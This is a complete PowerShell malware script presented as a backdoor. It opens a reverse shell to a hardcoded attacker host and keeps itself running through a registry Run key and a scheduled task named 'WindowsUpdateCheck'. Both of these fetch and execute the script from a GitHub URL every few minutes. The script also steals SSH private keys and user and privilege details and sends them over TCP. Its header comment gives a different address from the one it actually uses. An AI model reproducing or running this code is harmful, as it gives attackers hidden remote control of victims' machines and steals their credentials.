# shell_v7.ps1 - Persistence + Backdoor Priority
# Reliable reverse TCP to 192.168.11.67:4444 + SSH key grab + scheduled task backup

# Config
$LHOST = "192.168.1.15"
$LPORT = 4444
$SCRIPT_URL = "https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v7.ps1"

# Reverse shell function (path prompt fixed)
function Start-ReverseShell {
    $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{0}
    
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
        $sendback = (iex $data 2>&1 | Out-String )
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()
}

# Persistence: Registry HKCU Run
function Set-RegistryPersistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "SysUpdate"
    $regValue = "powershell -w hidden -nop -WindowStyle Hidden -c `"IEX(New-Object Net.WebClient).DownloadString('$SCRIPT_URL')`""
    
    if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
    }
}

# Backup Persistence: Scheduled Task (runs every 5min)
function Set-ScheduledTaskPersistence {
    $taskName = "WindowsUpdateCheck"
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -nop -WindowStyle Hidden -c `"IEX(New-Object Net.WebClient).DownloadString('$SCRIPT_URL')`""
    $taskTrigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue)
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Force | Out-Null
}

# Backdoor: Grab SSH keys and exfil
function Grab-SSHKeys {
    $sshDir = "$env:USERPROFILE\.ssh"
    $keys = @()
    
    if (Test-Path $sshDir) {
        Get-ChildItem -Path $sshDir -Filter "id_*" -Recurse -File | ForEach-Object { $keys += $_.FullName }
        if (Test-Path "$sshDir\id_rsa") { $keys += "$sshDir\id_rsa" }
    }
    
    foreach ($key in $keys) {
        try {
            $content = Get-Content $key -Raw
            $exfilData = "SSHKEY|$key`n$content`n---"
            $tcp = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
            $stream = $tcp.GetStream()
            $bytes = [System.Text.Encoding]::ASCII.GetBytes($exfilData)
            $stream.Write($bytes, 0, $bytes.Length)
            $stream.Close()
            $tcp.Close()
        } catch { }
    }
}

# Cred dump
function Dump-Creds {
    $creds = @()
    $creds += "USER: $env:USERNAME"
    $creds += "HOST: $env:COMPUTERNAME"
    $creds += "PRIVS: " + (& whoami /priv)
    $creds += "PATH: $env:PATH"
    
    $exfilData = "CREDS`n" + ($creds -join "`n") + "`n---"
    try {
        $tcp = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $tcp.GetStream()
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($exfilData)
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()
        $tcp.Close()
    } catch { }
}

# Main execution
Start-Job -ScriptBlock { 
    Set-RegistryPersistence
    Set-ScheduledTaskPersistence
    Dump-Creds
    Grab-SSHKeys
    Start-Sleep 2
    Start-ReverseShell
} | Out-Null

# Keep alive
while ($true) { Start-Sleep 30 }
